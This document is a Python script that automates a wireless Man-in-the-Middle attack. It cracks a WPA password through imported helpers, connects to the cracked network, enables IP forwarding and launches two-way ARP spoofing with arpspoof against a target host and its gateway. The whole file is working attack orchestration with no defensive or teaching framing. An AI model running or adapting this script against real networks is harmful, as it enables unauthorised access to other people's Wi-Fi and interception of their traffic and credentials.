import os
import subprocess
from HostDiscovery import device_discovery  # Importing function for device discovery
from ConnectCrackedNetwork import connect_to_cracked_network  # Importing function to connect to cracked network
from MonitorMode import switch_monitor_mode  # Importing function to switch to monitor mode
from WPA_Handshake import wpa_capture_password_cracking  # Importing function for WPA handshake capture and password cracking
from RestartNetwork import restart_network_services  # Importing function to restart network services


def man_in_middle_attack():
    """
    Perform a Man-in-the-Middle (MITM) attack on a network.
    """
    switch_monitor_mode()  # Switching to monitor mode for network sniffing
    wpa_capture_password_cracking()  # Capturing WPA handshake and cracking the password
    restart_network_services()  # Restarting network services
    connect_to_cracked_network()  # Connecting to the cracked network
    device_discovery()  # Discovering devices on the network

    # Enabling IP forwarding to allow packet forwarding between interfaces
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    # Defining ARP spoofing commands
    command1 = ["arpspoof", "-i", "wlan0mon", "-t", "192.168.10.3", "192.168.10.1"]
    command2 = ["arpspoof", "-i", "wlan0mon", "-t", "192.168.10.1", "192.168.10.3"]

    # Launching ARP spoofing commands in separate processes
    subprocess.Popen(command1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(command2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Displaying ARP spoofing processes
    os.system('ps aux | grep "arpspoof"')
